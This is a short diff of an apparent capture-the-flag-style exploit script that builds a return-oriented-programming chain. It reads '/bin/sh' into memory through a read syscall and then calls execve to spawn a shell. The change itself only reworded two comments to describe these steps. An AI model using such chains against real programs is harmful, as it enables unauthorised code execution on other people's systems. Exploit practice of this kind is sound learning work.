@@ -36,7 +36,7 @@ buf += p(0x0)
 buf += "A"*88
 buf += p(0x0)
 buf += "C"*192
-# read "/bin/sh"
+# read(0, bss_addr, 8) to input "/bin/sh" from STDIN
 buf += p(poprax)
 buf += p(bss_addr)
 buf += p(poprdx)
@@ -48,7 +48,7 @@ buf += p(0x0)
 buf += p(poprax)
 buf += p(0x0)
 buf += p(syscall)
-# execve
+# execve("/bin/sh",0,0)
 buf += p(poprax)
 buf += p(bss_addr)
 buf += p(poprdx)
